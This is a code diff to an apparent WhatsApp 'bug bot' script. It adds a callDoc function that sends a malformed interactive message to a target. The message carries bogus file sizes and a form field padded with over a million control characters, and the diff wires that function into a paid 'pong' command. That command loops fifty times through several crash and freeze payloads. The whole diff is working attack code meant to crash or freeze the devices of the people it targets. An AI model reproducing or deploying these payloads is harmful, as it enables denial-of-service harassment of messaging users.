@@ -1888,7 +1888,73 @@ async function mentbug(target) {
       });
 }
 
+async function callDoc(XeonBotInc, target) {
+  XeonBotInc.relayMessage(target, {
+    viewOnceMessage: {
+        message: {
+            interactiveMessage: {
+                header: {
+                    documentMessage: {
+                        url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                        fileLength: "999999999",
+                        pageCount: 0x9184e729fff,
+                        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                        fileName: "✞Xᴄʜʀɪss Bot✞",
+                        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                        directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                        mediaKeyTimestamp: "1715880173",
+                        contactVcard: true
+                    },
+                    title: "DeAD",
+                    hasMediaAttachment: true
+                },
+                body: {
+                    text: "✞Xᴄʜʀɪss Bot✞"
+                },
+                nativeFlowMessage: {
+                    buttons: [
+                        {
+                            name: 'call_permission_request',
+                            buttonParamsJson: '{}'
+                        }
+                    ]
+                },
+                contextInfo: {
+                    quotedMessage: {
+                        interactiveResponseMessage: {
+                            body: { 
+                                text: "Sent", 
+                                format: "DEFAULT" 
+                            },
+                            nativeFlowResponseMessage: {
+                                name: "galaxy_message",
+                                paramsJson: `{
+                                    "screen_2_OptIn_0": true,
+                                    "screen_2_OptIn_1": true,
+                                    "screen_1_Dropdown_0": "【 𖤍 】 𝙻𝙾𝚁𝙳 Xᴄʜʀɪss",
+                                    "screen_1_DatePicker_1": "1028995200000",
+                                    "screen_1_TextInput_2": "phoenixgibson007@gmail.com",
+                                    "screen_1_TextInput_3": "94643116",
+                                    "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(1020000)}",
+                                    "screen_0_TextInput_1": "Why?",
+                                    "screen_0_Dropdown_2": "001-Grimgar",
+                                    "screen_0_RadioButtonsGroup_3": "0_true",
+                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
+                                }`,
+                                version: 3
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}, { participant: { jid: target } }, { messageId: null });
+}
 
+	    
         switch (command) {
 case "pong": {
 if (!isPremium) return replygcxeon(mess.prem)
@@ -1896,6 +1962,7 @@ let target = m.chat
 await replygcxeon ("✞Xᴄʜʀɪss Bot✞")
 for (let i = 0;i < 50;i++) {
 await dott(target)
+await callDoc(XeonBotInc, target)
 await BugFrezee(target) 
 await ios1(target)
 await callbg(target)
@@ -1903,10 +1970,12 @@ await ios2(target)
 await ioscrash(target)
 await ioscrash(target)
 await OLDLOC(target, TypeNull)
+await callDoc(XeonBotInc, target)
 await mentbug(target)
-await freezegc(target)
+await freezegc(target, true)
 await ios1(target)
 await callbg(target)
+await callDoc(XeonBotInc, target)
 await ios2(target)
 await ioscrash(target)
 await ioscrash(target)
